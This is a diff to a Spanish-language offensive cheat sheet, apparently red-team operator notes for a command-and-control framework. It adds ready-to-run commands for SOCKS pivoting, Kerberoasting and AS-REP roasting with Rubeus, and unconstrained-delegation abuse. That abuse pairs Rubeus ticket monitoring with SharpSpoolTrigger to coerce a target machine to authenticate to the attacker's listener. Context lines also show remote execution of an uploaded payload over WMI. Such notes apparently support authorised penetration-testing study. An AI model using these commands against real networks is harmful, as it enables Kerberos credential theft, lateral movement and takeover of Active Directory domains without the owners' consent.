@@ -303,3 +303,28 @@ upload C:\Payloads\smb_x64.exe
 ```
 remote-exec wmi PC C:\Windows\smb_x64.exe
 ```
+# Pivoting
+Usar socks
+```
+socks 1080
+```
+# Kerberos
+
+## Kerberoasting
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
+```
+## ASREPROASTING
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
+```
+## Unconstrained Delegation
+
+Ponerse escucha para recibir un TGT
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
+```
+Forzar la autenticacion de un equipo a nosotros
+```
+execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe TARGET LISTENER
+```
